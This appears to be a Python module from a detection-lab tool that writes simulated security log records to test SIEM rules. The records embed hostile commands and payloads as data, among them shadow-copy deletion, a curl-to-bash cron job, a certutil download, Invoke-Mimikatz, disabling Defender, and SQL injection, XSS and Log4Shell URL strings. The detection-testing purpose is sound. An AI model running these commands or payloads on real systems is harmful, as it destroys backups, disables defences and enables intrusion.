"""Coverage pack: small scenarios that exercise the rules the main scenarios do not touch.

Registered into SCENARIOS when scenarios.py is imported (see its last line).  Like every
scenario they only *write log records* - nothing is executed, scanned or attempted.
"""
from __future__ import annotations

import json

from ..common.timeutil import to_iso
from .scenarios import (CHANNEL_DATASETS, POWERSHELL, SCENARIOS, SECURITY, SYSMON, Ctx, _logon_common, env_auditd,
                        env_nginx_error, env_syslog, env_web, env_win, sysmon_network, sysmon_process)

DEFENDER = ("Microsoft-Windows-Windows Defender/Operational", "Microsoft-Windows-Windows Defender", "{11CD958A-C507-4EF3-B3F2-5FD9DFBD2C78}")
CHANNEL_DATASETS[DEFENDER[0]] = "windows.defender"
OUTSIDE_IP = "203.0.113.50"   # documentation range: outside the lab networks and not on the intel list


def _ut(ctx: Ctx) -> str:
    return ctx._t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]


def env_winfw(ctx: Ctx, action: str, proto: str, src: str, dst: str, spt: int, dpt: int, path: str, scenario: str, ts=None) -> dict:
    ts = ts or ctx.tick()
    raw = f"{ts:%Y-%m-%d %H:%M:%S} {action} {proto} {src} {dst} {spt} {dpt} 52 S 0 0 0 - - - {path}"
    return {"raw": raw, "dataset": "windows.firewall_log", "host.name": ctx.host, "host.os.type": "windows",
            "agent.type": "simulate", "@timestamp": to_iso(ts), "fields": {"labels.simulation": scenario}}


def _dns(ctx: Ctx, name: str, image: str) -> dict:
    return {"RuleName": "-", "UtcTime": _ut(ctx), "ProcessGuid": "{00000000-0000-0000-0000-0000000000aa}", "ProcessId": "4242",
            "QueryName": name, "QueryStatus": "0", "QueryResults": "::ffff:192.0.2.23;", "Image": image, "User": f"LAB\\{ctx.user}"}


# ---- Windows Security ---------------------------------------------------- #

def password_spray(ctx: Ctx) -> list[dict]:
    out = []
    for user in ("administrator", "aysel", "leyla", "rauf", "svc_backup", "guest", "helpdesk", "nigar", "elvin", "kamran"):
        data = _logon_common(ctx, user, 3, ctx.source_ip, "KALI-LAB")
        data.update({"Status": "0xc000006d", "FailureReason": "%%2313", "SubStatus": "0xc000006a"})
        out.append(env_win(ctx, SECURITY, 4625, data, "password-spray", keywords="0x8010000000000000", task=12544, ts=ctx.tick(3)))
    return out


def account_lockout(ctx: Ctx) -> list[dict]:
    data = {"TargetUserName": ctx.user, "TargetDomainName": "WS01", "TargetSid": "S-1-5-21-1-2-3-1105", "SubjectUserSid": "S-1-5-18",
            "SubjectUserName": "DC01$", "SubjectDomainName": "LAB", "SubjectLogonId": "0x3e7"}
    return [env_win(ctx, SECURITY, 4740, data, "account-lockout", computer=ctx.dc, task=13824)]


def logon_outside_lab(ctx: Ctx) -> list[dict]:
    data = _logon_common(ctx, ctx.user, 10, OUTSIDE_IP, "UNKNOWN-PC")
    data.update({"TargetLogonId": "0x7a1b2", "ElevatedToken": "%%1843", "TargetUserSid": "S-1-5-21-1-2-3-1105"})
    return [env_win(ctx, SECURITY, 4624, data, "logon-outside-lab", task=12544)]


def explicit_credentials(ctx: Ctx) -> list[dict]:
    data = {"SubjectUserSid": "S-1-5-21-1-2-3-1105", "SubjectUserName": ctx.user, "SubjectDomainName": "LAB", "SubjectLogonId": "0x1a2b3c",
            "LogonGuid": "{00000000-0000-0000-0000-000000000000}", "TargetUserName": "administrator", "TargetDomainName": "LAB",
            "TargetLogonGuid": "{00000000-0000-0000-0000-000000000000}", "TargetServerName": "dc01.lab.local", "TargetInfo": "dc01.lab.local",
            "ProcessId": "0x1234", "ProcessName": "C:\\Windows\\System32\\svchost.exe", "IpAddress": "10.10.20.10", "IpPort": "0"}
    return [env_win(ctx, SECURITY, 4648, data, "explicit-credentials", task=12544)]


def kerberos_failures(ctx: Ctx) -> list[dict]:
    out = []
    for i in range(25):
        data = {"TargetUserName": ["administrator", ctx.user, "svc_backup"][i % 3], "TargetDomainName": "LAB.LOCAL", "ServiceName": "krbtgt/LAB.LOCAL",
                "TicketOptions": "0x40810010", "Status": "0x18", "PreAuthType": "2", "IpAddress": f"::ffff:{ctx.source_ip}", "IpPort": str(50000 + i)}
        out.append(env_win(ctx, SECURITY, 4771, data, "kerberos-failures", computer=ctx.dc, keywords="0x8010000000000000", task=14339, ts=ctx.tick(2)))
    return out


def account_lifecycle(ctx: Ctx) -> list[dict]:
    subj = {"SubjectUserSid": "S-1-5-21-1-2-3-500", "SubjectUserName": "administrator", "SubjectDomainName": "LAB", "SubjectLogonId": "0x3e7"}
    out = [env_win(ctx, SECURITY, 4724, {**subj, "TargetUserName": "leyla", "TargetDomainName": "LAB", "TargetSid": "S-1-5-21-1-2-3-1106"},
                   "account-lifecycle", computer=ctx.dc, task=13824)]
    out.append(env_win(ctx, SECURITY, 4726, {**subj, "TargetUserName": "kbtest", "TargetDomainName": "LAB", "TargetSid": "S-1-5-21-1-2-3-1201", "PrivilegeList": "-"},
                       "account-lifecycle", computer=ctx.dc, task=13824))
    return out


def audit_tampering(ctx: Ctx) -> list[dict]:
    subj = {"SubjectUserSid": "S-1-5-21-1-2-3-1105", "SubjectUserName": ctx.user, "SubjectDomainName": "LAB", "SubjectLogonId": "0x1a2b3c"}
    out = [env_win(ctx, SECURITY, 4719, {**subj, "CategoryId": "%%8274", "SubcategoryId": "%%12544",
                                          "SubcategoryGuid": "{0cce9215-69ae-11d9-bed3-505054503030}", "AuditPolicyChanges": "%%8449"}, "audit-tampering", task=13568)]
    out.append(env_win(ctx, SYSMON, 16, {"UtcTime": _ut(ctx), "Configuration": "C:\\Users\\Public\\empty.xml", "ConfigurationFileHash": "SHA256=0000"},
                       "audit-tampering", ts=ctx.tick(5)))
    out.append(env_win(ctx, DEFENDER, 5001, {"Product Name": "Microsoft Defender Antivirus", "Product Version": "4.18"}, "audit-tampering", ts=ctx.tick(5)))
    return out


def defender_detection(ctx: Ctx) -> list[dict]:
    data = {"Product Name": "Microsoft Defender Antivirus", "Product Version": "4.18", "Detection ID": "{00000000-0000-0000-0000-0000000000dd}",
            "Threat ID": "2147519003", "Threat Name": "Virus:DOS/EICAR_Test_File", "Severity ID": "5", "Severity Name": "Severe",
            "Category ID": "42", "Category Name": "Virus", "Path": f"file:_C:\\Users\\{ctx.user}\\Downloads\\eicar.com",
            "Detection User": f"LAB\\{ctx.user}", "Process Name": "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "Action ID": "9", "Action Name": "Not Applicable"}
    return [env_win(ctx, DEFENDER, 1116, data, "defender-detection", level=3)]


# ---- Sysmon / PowerShell -------------------------------------------------- #

def injection_and_tampering(ctx: Ctx) -> list[dict]:
    rt = {"RuleName": "-", "UtcTime": _ut(ctx), "SourceProcessGuid": "{00000000-0000-0000-0000-0000000000b1}", "SourceProcessId": "5300",
          "SourceImage": "C:\\Users\\Public\\kb-test.exe", "TargetProcessGuid": "{00000000-0000-0000-0000-0000000000b2}", "TargetProcessId": "1500",
          "TargetImage": "C:\\Windows\\explorer.exe", "NewThreadId": "5310", "StartAddress": "0x00007FF6A0001000", "StartModule": "-", "StartFunction": "-",
          "SourceUser": f"LAB\\{ctx.user}", "TargetUser": f"LAB\\{ctx.user}"}
    out = [env_win(ctx, SYSMON, 8, rt, "injection-and-tampering")]
    ctx.tick(3)
    tamper = {"RuleName": "-", "UtcTime": _ut(ctx), "ProcessGuid": "{00000000-0000-0000-0000-0000000000b3}", "ProcessId": "5400",
              "Image": "C:\\Users\\Public\\kb-hollow.exe", "Type": "Image is replaced", "User": f"LAB\\{ctx.user}"}
    out.append(env_win(ctx, SYSMON, 25, tamper, "injection-and-tampering"))
    return out


def ransomware_precursor(ctx: Ctx) -> list[dict]:
    out = [env_win(ctx, SYSMON, 1, sysmon_process(ctx, "C:\\Windows\\System32\\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet",
                                                  "C:\\Windows\\System32\\cmd.exe", "cmd.exe", integrity="High"), "ransomware-precursor")]
    out.append(env_win(ctx, SYSMON, 1, sysmon_process(ctx, "C:\\Windows\\System32\\wbadmin.exe", "wbadmin.exe delete catalog -quiet",
                                                      "C:\\Windows\\System32\\cmd.exe", "cmd.exe", integrity="High"), "ransomware-precursor", ts=ctx.tick(2)))
    return out


def registry_persistence(ctx: Ctx) -> list[dict]:
    base = {"RuleName": "-", "EventType": "SetValue", "ProcessGuid": "{00000000-0000-0000-0000-0000000000c1}", "ProcessId": "5500", "User": f"LAB\\{ctx.user}"}
    out = [env_win(ctx, SYSMON, 13, {**base, "UtcTime": _ut(ctx), "Image": "C:\\Users\\Public\\kb-test.exe",
                                     "TargetObject": "HKU\\S-1-5-21-1-2-3-1105\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\KBUpdater",
                                     "Details": "C:\\Users\\Public\\kb-test.exe"}, "registry-persistence")]
    ctx.tick(3)
    out.append(env_win(ctx, SYSMON, 13, {**base, "UtcTime": _ut(ctx), "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                         "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring",
                                         "Details": "DWORD (0x00000001)"}, "registry-persistence"))
    return out


def recon_burst(ctx: Ctx) -> list[dict]:
    out = []
    for image, cmd in (("C:\\Windows\\System32\\whoami.exe", "whoami /all"), ("C:\\Windows\\System32\\net.exe", "net user"),
                       ("C:\\Windows\\System32\\net1.exe", "net1 localgroup administrators"), ("C:\\Windows\\System32\\ipconfig.exe", "ipconfig /all"),
                       ("C:\\Windows\\System32\\systeminfo.exe", "systeminfo"), ("C:\\Windows\\System32\\nltest.exe", "nltest /dclist:lab"),
                       ("C:\\Windows\\System32\\tasklist.exe", "tasklist /v")):
        out.append(env_win(ctx, SYSMON, 1, sysmon_process(ctx, image, cmd, "C:\\Windows\\System32\\cmd.exe", "cmd.exe"), "recon-burst", ts=ctx.tick(4)))
    return out


def powershell_offensive_keywords(ctx: Ctx) -> list[dict]:
    sb = {"MessageNumber": "1", "MessageTotal": "1", "ScriptBlockText": "Import-Module .\\kb-test.ps1; Invoke-Mimikatz",
          "ScriptBlockId": "bbbbbbbb-1111-2222-3333-cccccccccccc", "Path": "C:\\Users\\Public\\kb-test.ps1"}
    return [env_win(ctx, POWERSHELL, 4104, sb, "powershell-offensive-keywords", level=3)]


def intel_hash(ctx: Ctx) -> list[dict]:
    data = sysmon_process(ctx, "C:\\Users\\Public\\eicar-test.exe", "eicar-test.exe", "C:\\Windows\\explorer.exe", "explorer.exe")
    data["Hashes"] = "SHA256=275A021BBFB6489E54D471899F7DB9D1663FC695EC2FE2A2C4538AABF651FD0F,IMPHASH=00000000000000000000000000000000"
    return [env_win(ctx, SYSMON, 1, data, "intel-hash")]


# ---- Linux ---------------------------------------------------------------- #

def ssh_outside_lab(ctx: Ctx) -> list[dict]:
    out = [env_syslog(ctx, "sshd", f"Accepted password for root from {OUTSIDE_IP} port 51000 ssh2", "ssh-outside-lab")]
    out.append(env_syslog(ctx, "sshd", "pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)", "ssh-outside-lab"))
    return out


def ssh_slow_brute(ctx: Ctx) -> list[dict]:
    out = []
    for i in range(3):
        out.append(env_syslog(ctx, "sshd", f"Failed password for {ctx.user} from {ctx.source_ip} port {42000 + i} ssh2", "ssh-slow-brute", ts=ctx.tick(60)))
    out.append(env_syslog(ctx, "sshd", f"Accepted password for {ctx.user} from {ctx.source_ip} port 42010 ssh2", "ssh-slow-brute", ts=ctx.tick(60)))
    return out


def su_and_cron(ctx: Ctx) -> list[dict]:
    out = [env_syslog(ctx, "su", f"FAILED SU (to root) {ctx.user} on pts/0", "su-and-cron")]
    out.append(env_syslog(ctx, "su", f"pam_unix(su:auth): authentication failure; logname={ctx.user} uid=1001 euid=0 tty=pts/0 ruser={ctx.user} rhost=  user=root", "su-and-cron"))
    out.append(env_syslog(ctx, "CRON", "(root) CMD (curl -s http://files.lab.test/kb-cron.sh | bash > /dev/null 2>&1)", "su-and-cron", dataset="linux.cron"))
    return out


def auditd_tamper(ctx: Ctx) -> list[dict]:
    out = [env_auditd(ctx, "CONFIG_CHANGE", "auid=1001 ses=42 subj=unconfined op=set audit_enabled=0 old=1 auid=1001 ses=42 res=1", "auditd-tamper")]
    out.append(env_auditd(ctx, "SERVICE_STOP", "pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=auditd comm=\"systemd\" "
                                               "exe=\"/usr/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'", "auditd-tamper"))
    return out


# ---- Network / web -------------------------------------------------------- #

def host_sweep(ctx: Ctx) -> list[dict]:
    out = []
    for i in range(12):
        data = sysmon_network(ctx, "C:\\Users\\Public\\kb-test.exe", "10.10.20.10", 50000 + i, f"10.10.30.{10 + i}", 445, initiated=True)
        out.append(env_win(ctx, SYSMON, 3, data, "host-sweep", ts=ctx.tick(2)))
    return out


def windows_firewall_scan(ctx: Ctx) -> list[dict]:
    out = []
    for port in (21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 389, 443, 445, 993, 1433, 3306, 3389, 5432, 5900, 8080):
        out.append(env_winfw(ctx, "DROP", "TCP", ctx.source_ip, "10.10.20.10", ctx.rnd.randint(40000, 65000), port, "RECEIVE", "windows-firewall-scan", ts=ctx.tick(1)))
    return out


def dns_tunnel(ctx: Ctx) -> list[dict]:
    out = []
    for _ in range(120):
        ts = ctx.tick(1)
        out.append(env_win(ctx, SYSMON, 22, _dns(ctx, f"{ctx.rnd.getrandbits(64):016x}.kbtunnel-test.org", "C:\\Users\\Public\\kb-test.exe"), "dns-tunnel", ts=ts))
    return out


def web_injection(ctx: Ctx) -> list[dict]:
    out = []
    ua = "Mozilla/5.0 (X11; Linux x86_64) sqlmap/1.8"
    for path in ("/products?id=1+union+select+1,2,3--", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
                 "/api?x=${jndi:ldap://203.0.113.9/a}", "/login?user=admin%27%20or%201=1--"):
        out.append(env_web(ctx, ctx.source_ip, "GET", path, 500, 300, ua, "web-injection"))
    for i in range(6):
        out.append(env_nginx_error(ctx, "error", f'connect() failed (111: Connection refused) while connecting to upstream, client: 10.10.20.{30 + i}, '
                                                 f'server: srv-web01, request: "GET /api/orders HTTP/1.1", upstream: "http://127.0.0.1:9000/api/orders", host: "srv-web01"',
                                   "web-injection"))
    return out


# ---- Correlation / SIEM health ------------------------------------------- #

def scan_then_logon(ctx: Ctx) -> list[dict]:
    out = []
    for i in range(22):
        msg = (f"[UFW BLOCK] IN=eth0 OUT= MAC=00:15:5d:01:02:03:00:15:5d:aa:bb:cc:08:00 SRC={ctx.source_ip} DST=10.10.30.20 LEN=44 TOS=0x00 PREC=0x00 "
               f"TTL=52 ID={ctx.rnd.randint(1000, 65000)} PROTO=TCP SPT={ctx.rnd.randint(40000, 65000)} DPT={1000 + i} WINDOW=1024 RES=0x00 SYN URGP=0")
        out.append(env_syslog(ctx, "kernel", msg, "scan-then-logon", dataset="linux.firewall", ts=ctx.tick(1)))
    out.append(env_syslog(ctx, "sshd", f"Accepted password for {ctx.user} from {ctx.source_ip} port 43210 ssh2", "scan-then-logon", ts=ctx.tick(30)))
    return out


def download_then_beacon(ctx: Ctx) -> list[dict]:
    out = [env_win(ctx, SYSMON, 1, sysmon_process(ctx, "C:\\Windows\\System32\\certutil.exe",
                                                  "certutil.exe -urlcache -split -f http://files.lab.test/kb-agent.exe C:\\Users\\Public\\kb-agent.exe",
                                                  "C:\\Windows\\System32\\cmd.exe", "cmd.exe"), "download-then-beacon")]
    ctx.tick(20)
    out.append(env_win(ctx, SYSMON, 3, sysmon_network(ctx, "C:\\Users\\Public\\kb-agent.exe", "10.10.20.10", 50777, "192.0.2.10", 8443, initiated=True),
                       "download-then-beacon"))
    return out


def agent_silent(ctx: Ctx) -> list[dict]:
    doc = {"@timestamp": to_iso(ctx.tick()), "event.dataset": "kharibulbul.internal", "event.module": "kharibulbul", "event.category": "host",
           "event.type": "info", "event.action": "agent-silent", "event.outcome": "unknown", "event.severity": "medium",
           "message": "Agent ws02 on ws02 has not reported for 600s", "host.name": "ws02", "agent.id": "test-agent-ws02", "agent.name": "ws02"}
    return [{"raw": json.dumps(doc), "dataset": "kharibulbul.internal", "agent.type": "simulate", "fields": {"labels.simulation": "agent-silent"}}]


SCENARIOS.update({
    "password-spray": ("4625 for 10 different accounts from one IP (KB-WIN-002, KB-WIN-001)", password_spray),
    "account-lockout": ("4740 account locked out on the DC (KB-WIN-003)", account_lockout),
    "logon-outside-lab": ("4624 RDP logon from an address outside the lab ranges (KB-WIN-004)", logon_outside_lab),
    "explicit-credentials": ("4648 explicit credentials towards the DC (KB-WIN-005)", explicit_credentials),
    "kerberos-failures": ("25x 4771 Kerberos pre-auth failures from one IP (KB-WIN-006)", kerberos_failures),
    "account-lifecycle": ("4724 password reset + 4726 user deleted (KB-WIN-013, KB-WIN-012)", account_lifecycle),
    "audit-tampering": ("4719 audit policy change, Sysmon 16 config change, Defender 5001 (KB-WIN-021, KB-WIN-024, KB-WIN-022)", audit_tampering),
    "defender-detection": ("Defender 1116 EICAR detection (KB-WIN-023)", defender_detection),
    "injection-and-tampering": ("Sysmon 8 remote thread + Sysmon 25 process tampering (KB-SYS-041, KB-SYS-060)", injection_and_tampering),
    "ransomware-precursor": ("vssadmin delete shadows / wbadmin delete catalog command lines (KB-SYS-061)", ransomware_precursor),
    "registry-persistence": ("Sysmon 13 Run key + DisableRealtimeMonitoring (KB-SYS-070, KB-SYS-071)", registry_persistence),
    "recon-burst": ("7 discovery commands in 30 seconds (KB-SYS-017)", recon_burst),
    "powershell-offensive-keywords": ("4104 script block with offensive-tool keyword (KB-PS-003)", powershell_offensive_keywords),
    "intel-hash": ("Sysmon 1 with the EICAR hash from intel/hashes.txt (KB-TI-003)", intel_hash),
    "ssh-outside-lab": ("root SSH login from outside the lab (KB-LNX-003, KB-LNX-004)", ssh_outside_lab),
    "ssh-slow-brute": ("3 password failures then a password success for the same user (KB-LNX-005)", ssh_slow_brute),
    "su-and-cron": ("FAILED su to root + cron job piping curl into bash (KB-LNX-014, KB-LNX-016)", su_and_cron),
    "auditd-tamper": ("auditd CONFIG_CHANGE audit_enabled=0 and auditd service stopped (KB-LNX-022)", auditd_tamper),
    "host-sweep": ("one process connecting to 12 hosts on port 445 (KB-NET-004)", host_sweep),
    "windows-firewall-scan": ("pfirewall.log DROP for 20 ports from one source (KB-NET-003)", windows_firewall_scan),
    "dns-tunnel": ("120 unique sub-domain queries of one domain in 2 minutes (KB-NET-012, KB-NET-014)", dns_tunnel),
    "web-injection": ("injection payloads in URLs + nginx upstream failures (KB-WEB-005, KB-WEB-008)", web_injection),
    "scan-then-logon": ("22 blocked ports then an accepted SSH login from the same source (KB-COR-004, KB-NET-002)", scan_then_logon),
    "download-then-beacon": ("certutil download then outbound connection from Users\\Public (KB-COR-005, KB-SYS-010)", download_then_beacon),
    "agent-silent": ("internal agent-silent event (KB-KB-001)", agent_silent),
})
